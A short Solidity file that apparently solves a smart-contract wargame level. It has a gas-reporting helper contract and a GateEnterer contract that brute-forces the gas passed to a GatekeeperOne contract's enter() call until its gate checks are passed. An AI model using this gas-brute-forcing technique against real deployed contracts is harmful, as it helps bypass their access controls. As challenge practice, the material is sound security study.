// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract GasGuzzler {
    uint public gasCounter;

    function gasUsed() public returns (uint){
        gasCounter = gasleft();
        return gasleft();
    }

    function txOrigin() public view returns (address){
        return tx.origin;
    }

    function msgSender() public view returns (address){
        return msg.sender;
    }

}

contract GateEnterer {

 function callTwoGateEnterer(address _addr, bytes8 _gateKey) public { 
     GatekeeperOne gatekeeperOne = GatekeeperOne(_addr);
     uint startIndex = 150;
     uint endIndex = 270;

     for (uint i = startIndex; i < endIndex; i++) {
         (bool result) = 
         gatekeeperOne.enter{gas: i + 8191 * 3}(_gateKey); 
     if (result) {
         break;
     }
    }
 }

}